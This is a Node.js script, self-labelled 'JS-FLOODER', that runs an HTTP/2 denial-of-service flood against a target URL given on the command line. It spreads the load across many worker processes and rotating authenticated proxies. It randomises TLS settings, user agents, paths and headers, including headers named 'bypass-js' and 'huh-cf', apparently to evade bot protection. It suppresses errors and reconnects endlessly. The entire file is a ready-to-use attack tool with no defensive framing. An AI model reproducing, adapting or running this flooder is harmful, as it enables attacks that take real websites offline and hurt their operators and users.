const url = require('url'),
  fs = require('fs'),
  http2 = require('http2'),
  http = require('http'),
  tls = require('tls'),
  cluster = require('cluster')
//random ua by string
const crypto = require('crypto');
const os = require("os");
const currentTime = new Date();
const httpTime = currentTime.toUTCString();
const v8 = require('v8')
const errorHandler = error => {
 //console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

try {
  var colors = require('colors');
} catch (err) {
  console.log('\x1b[36mInstalling\x1b[37m the requirements');
  execSync('npm install colors');
  console.log('Done.');
  process.exit();
}
cplist = ['TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_128_CCM_8_SHA256', 'TLS_AES_128_CCM_SHA256', 'TLS_AES_128_GCM_SHA256', 'TLS_AES_256_GCM_SHA384', ]
controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400'], ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'], ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
  cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
  },
}
process.on('uncaughtException', function(e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
  if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
const target = process.argv[2];
const time = process.argv[3];
const thread = process.argv[4];
const proxyFile = process.argv[5];
const rps = process.argv[6];
let input = 'bypass';
// Validate input
if (!target || !time || !thread || !proxyFile || !rps || !input) {
  console.log('JS-FLOODER'.bgRed)
  console.error(`Example: node ${process.argv[1]} url time thread proxy.txt rate query(true/false)`.rainbow);
  console.log('default : query : true'.red);
  process.exit(1);
}
// Validate target format
if (!/^https?:\/\//i.test(target)) {
  console.error('sent with http:// or https://');
  process.exit(1);
}
// Parse proxy list
let proxys = [];
try {
  const proxyData = fs.readFileSync(proxyFile, 'utf-8');
  proxys = proxyData.match(/\S+/g);
} catch (err) {
  console.error('Error proxy file:', err.message);
  process.exit(1);
}
// Validate RPS value
if (isNaN(rps) || rps <= 0) {
  console.error('number rps');
  process.exit(1);
}
const proxyr = () => {
  return proxys[Math.floor(Math.random() * proxys.length)];
}

function shuffleObject(obj) {
  const keys = Object.keys(obj);
  const shuffledKeys = keys.reduce((acc, _, index, array) => {
    const randomIndex = Math.floor(Math.random() * (index + 1));
    acc[index] = acc[randomIndex];
    acc[randomIndex] = keys[index];
    return acc;
  }, []);
  const shuffledObject = Object.fromEntries(shuffledKeys.map((key) => [key, obj[key]]));
  return shuffledObject;
}
const MAX_RAM_PERCENTAGE = 70;
const RESTART_DELAY = 100;
let postData
let post
if (cluster.isMaster) {
  console.clear()
  console.log('HEAP SIZE:',v8.getHeapStatistics().heap_size_limit/(1024*1024))
  console.log(`@STRSTRING`.bgRed), console.log(`[!] SARTA STORM`)
  process.stdout.write("Loading: 10%\n");
  setTimeout(() => {
    process.stdout.write("\rLoading: 50%\n");
  }, 500 * time);
  setTimeout(() => {
    process.stdout.write("\rLoading: 100%\n");
  }, time * 1000);
  const restartScript = () => {
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }
    console.log('[>] Restarting ', RESTART_DELAY, 'ms...');
    setTimeout(() => {
      for (let counter = 1; counter <= thread; counter++) {
        cluster.fork();
      }
    }, RESTART_DELAY);
  };
  const handleRAMUsage = () => {
    const totalRAM = os.totalmem();
    const usedRAM = totalRAM - os.freemem();
    const ramPercentage = (usedRAM / totalRAM) * 100;
    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
      console.log('[!] Maximum RAM ', ramPercentage.toFixed(2), '%');
      restartScript();
    }
  };
  const argsa = process.argv.slice(7);
  const queryIndexa = argsa.indexOf('--post');
  post = queryIndexa !== -1 ? argsa[queryIndexa + 1] : null;
  if (post === 'true') {
    argsq = process.argv.slice(7);
    const dataIndex = argsq.indexOf('--data');
    postData = dataIndex !== -1 ? argsq[dataIndex + 1] : null;
    if (postData === null || postData.trim() === '') {
      console.log("Require post data");
      process.exit();
    } else {
      // console.log('POST MODE');
    }
  } else {
    console.log('GET MODE');
  }
  setInterval(handleRAMUsage, 1000);
  for (let i = 0; i < thread; i++) {
    cluster.fork();
  }
  setTimeout(() => process.exit(-1), time * 1000);
} else {
  if (input === 'bypass') {
    const abu = setInterval(function() {
      flood()
    }, 1);
  } else {
    setInterval(flood)
  }
}
async function flood() {
  var parsed = url.parse(target);
  var cipper = headerFunc.cipher();
  var proxy = await proxyr().split(':');
  let interval
  if (input === 'flood') {
    interval = 1000;
  } else if (input === 'bypass') {
    function randomDelay(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    interval = randomDelay(500,1000);
  } else {
    interval = 1000;
  }
  var operatingSystems = ["Windows NT 10.0"];
  var architectures = {
    "Windows NT 10.0": `Win64; x64`,
    "X11": "Linux x86_64"
  };
  const plat = [
    "\"Windows\"",
 "\"Linux\"",
 "\"Android\"",
 "\"iOS\"",
 "\"Mac OS\"",
 "\"iPadOS\"",
 "\"BlackBerry OS\"",
 "\"Firefox OS\"",
];
const httpMethods = ['GET'];
  var browsers = ["Chrome/122.0.0.0 Safari/537.36", "Chrome/121.0.0.0 Safari/537.36", "Chrome/120.0.0.0 Safari/537.36", "Chrome/119.0.0.0 Safari/537.36" ];

  function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
  }
  const randomOS = getRandomValue(operatingSystems);
  const randomArch = architectures[randomOS];
  const randomBrowser = getRandomValue(browsers);
  method = getRandomValue(httpMethods)
  //console.log(uas)
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({
      length
    }, () => {
      const randomIndex = Math.floor(Math.random() * characters.length);
      return characters[randomIndex];
    });
    return randomStringArray.join('');
  }
function eko(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({
      length
    }, () => {
      const randomIndex = Math.floor(Math.random() * characters.length);
      return characters[randomIndex];
    });
    return randomStringArray.join('');
  }
  function randnum(minLength, maxLength) {
    const characters = '0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({
      length
    }, () => {
      const randomIndex = Math.floor(Math.random() * characters.length);
      return characters[randomIndex];
    });
    return randomStringArray.join('');
  }

  function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
  let hostt = proxy[0]
  let portt = proxy[1]
  
  //random object
 const agent = await new http.Agent({
    host: hostt,
    port: portt,
    keepAlive: true,
    keepAliveMsecs: 500000000,
    maxSockets: 50000,
    maxTotalSockets: 100000,
  });
  const Optionsreq = {
    agent: agent,
    method: 'CONNECT',
    path: parsed.host + ':443',
    timeout: 1000,
    headers: {
      'Host': parsed.host,
      'Proxy-Connection': 'Keep-Alive',
      'Connection': 'Keep-Alive',
      'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`,
    },
  };
  connection = await http.request(Optionsreq, (res) => {});
  connection.on('error', (err) => {
    if (err) return
  });
  connection.on('timeout', async () => {
    return
  });
  const args = process.argv.slice(7);
  const queryIndex = args.indexOf('--query');
  const query = queryIndex !== -1 ? args[queryIndex + 1] : null;
  const argsa = process.argv.slice(7);
  const queryIndexa = argsa.indexOf('--post');
  post = queryIndexa !== -1 ? argsa[queryIndexa + 1] : null;
  const bypass = process.argv.slice(2);
  const bypassindex = bypass.indexOf('--randuser');
  const index = bypassindex !== -1 ? bypass[bypassindex + 1] : null;
  const max = index || 'false'
  let passedrand
  let uas
  let data
  function generateData() {
    const choice = getRandomInt(1, 2);
    if (choice === 1) {
        data = {
            headerTableSize: 65536,
            enablePush: false,
            maxConcurrentStreams: 1,
            initialWindowSize: 8388608,
            maxFrameSize: 65536
        };
    } else {
        data = {
            headerTableSize: 65536,
            enablePush: false,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144
        };
    }
    return data; 
    }
let randstr =  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)

  const secdata = {
    "sec-fetch-mode":"same-origin",
    "sec-fetch-user": "?1",
  }
  const secdatax = {
   "sec-ch-ua-mobile": '?3',
   "sec-fetch-site": "none",
   "sec-fetch-dest": "document",
}
  const header = shuffleObject({
    "sec-ch-ua": Math.random() < 0.5 ? `\\\\\\\"Chromium\\\\\\\";v=\\\\\\\"122\\\\\\\",\\\\\\\"Google Chrome\\\\\\\";v=\\\\\\\"122\\\\\\\",\\\\\\\"Not-A.Brand\\\\\\\";v=\\\\\\\"99\\\\\\`:"\\\"Chromium\\\";v=\\\"122\\\", \\\"Google Chrome\\\";v=\\\"122\\\", \\\"Not-A.Brand\\\";v=\\\"8\\",
    "upgrade-insecure-requests": "1",
    "Sec-Ch-Ua-Platform": Math.random() < 0.5 ?"\\\\\\\"Windows\\\\\\" : "\\\"Windows\\",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;q=0.7",
     ...(Math.random() < 0.75 ? secdata : secdatax),
    "accept-encoding": "gzip, deflate, br, zstd",
	"accept-language": "ru,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7",
 "priority": "u=0, i",
  });
  //console.log(header);
  dynHeaders = {
  
   
	...(Math.random() < 0.4 ?{['x-cache-net']:  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
 } : {}),
	...(Math.random() < 0.4 ?{['ping-http']: generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
 } : {}),
   ['boolen-true-false']:  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
 ,
	...(Math.random() < 0.4 ?{['bypass-js']:  randstr } : {}),
	...(Math.random() < 0.4 ?{['huh-cf']:  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
 } : {}),
 ...(Math.random() < 0.4 ?{['xss-injection-cf']:  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
 } : {}),
	...(Math.random() < 0.4 ?{['most-attack']:  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
 } : {}),
  ...(Math.random() < 0.4 ?{['mach-flood']:  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
 } : {}),
	...(Math.random() < 0.4 ?{['coconut-cf']:  generateRandomString(1,10) + '-' +  generateRandomString(1,12) + '=' +generateRandomString(1,12)
 } : {}),
  }
  

  cipor = cplist.join(':')
  const TLSOPTION = {
    ...(Math.random() < 0.5 ? {
      ciphers: 'TLS_AES_256_GCM_SHA384:TLS_AES_128_GCM_SHA256:TLS_AES_128_CCM_SHA256'
    } : {
      cipher: cipor
    }),
    
      secureProtocol: Math.random() < 0.5 ? ['TLSv1.3_method', 'TLSv1.2_method'] : ['TLSv1.3_method'],
   
    ...(Math.random() < 0.5 ? {
      echdCurve: "X25519"
    } : {
      echdCurve: "secp256r1:X25519"
    }),
    sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
    secure: true,
    rejectUnauthorized: false,
    ALPNProtocols: Math.random() < 0.5 ?['h2']: ['h2',"http/1.1"],
    
      secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom
    
  };
  async function createCustomTLSSocket(parsed, socket) {
    const tlsSocket = await tls.connect({
      ...TLSOPTION,
      host: parsed.host,
      port: 443,
      servername: parsed.host,
      socket: socket
    });
    return tlsSocket;
  }
  
  
  
  connection.on('connect', async function(res, socket) {
    const tlsSocket = await createCustomTLSSocket(parsed, socket);
    
    if (generateData().initialWindowSize=== '8388608') {
     local = 8323073
     }else {
     local = 15663105
     }
     //console.log(generateData(),local)
    const client = await http2.connect(parsed.href, {
      createConnection: () => tlsSocket,
      
      settings: shuffleObject({
         ...generateData()
      }),
    }, (session) => {
    session.setLocalWindowSize(local);
})
   
    //client.ping((err, duration, payload) => {})
    //client.goaway(1, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('GO AWAY'));
    client.on("connect", async () => {
      
      setInterval(async () => {
      

        for (let i = 0; i < rps; i++) {
        if (max !=='true'){
  
    uas = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(99,199)}.0.0.0 Safari/537.36`

}else{
  uas = generateRandomString(5, 7) + `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(99,199)}.0.0.0 Safari/537.36` + getRandomInt(100, 99999) + '.' + getRandomInt(100, 99999)
}



        let ddd = generateRandomString(5, 15)+"-type-"+getRandomInt(1,250)+"-streamid-"+getRandomInt(1,290)
        let boolen = (Math.random() < 0.5 ?false : true)
          author = {
            ...(post === 'true' ? {
              ":method": "POST"
            } : {
              ":method": 'GET'
            }),
            ...(post === 'true' ? {
              "content-length": "0"
            } : {}),
            ":authority": parsed.host + (Math.random() < 0.5 ? '.' : ''),
            ":scheme":'https',
            ...(query === 'true' ? {
              ":path": parsed.path+ 'data' + generateRandomString(0, 10) + '=' + generateRandomString(10, 20) + '?' + 'data' + generateRandomString(0, 10) + '=' + generateRandomString(10, 20)
            } : {
              ":path": parsed.path
            }),
            
            "x-forwarded-for": ddd,
            'pragma' : "no-cache",
            "cache-control" : "no-cache"
          }
          head = header
          dyn = dynHeaders
          datas = await {
            ...author,
            'user-agent': uas,
            ...head,
            "accept-charset":ddd,
            ...dyn,
          }
          datax = await {
            ...author,
            'user-agent': uas,
            ...head,
            "accept-charset":ddd,
            ...dyn,
          }
          dataz = await {
            ...author,
            'user-agent': uas,
            ...head,
            "accept-charset":ddd,
            ...dyn,
          }
          //console.log(datas)
           const request = client.request(datas, {endStream: Math.random() < 0.5 ?false : true});
           request.priority({weight: 256,exclusive: true})
          const request1 = client.request(datax, {endStream: Math.random() < 0.5 ?false : true});
           request1.priority({weight: 256,exclusive: true})
           const request2 = client.request(dataz, {endStream: Math.random() < 0.5 ?false : true});
           request2.priority({weight: 256,exclusive: true})
           
           request.end('client end!')
           request1.end('client end!')
           request2.end('client end!')
        }
      }, interval);
      
    }); 
    client.on("close", () => {
      client.destroy();
      tlsSocket.destroy();
      socket.destroy();
      return flood()
    });
    
    client.on("error", async (error) => {
      if (error) {
        await client.destroy();
        await tlsSocket.destroy();
        await socket.destroy();
        return flood()
      }
    });
  });
  connection.end();
 
} //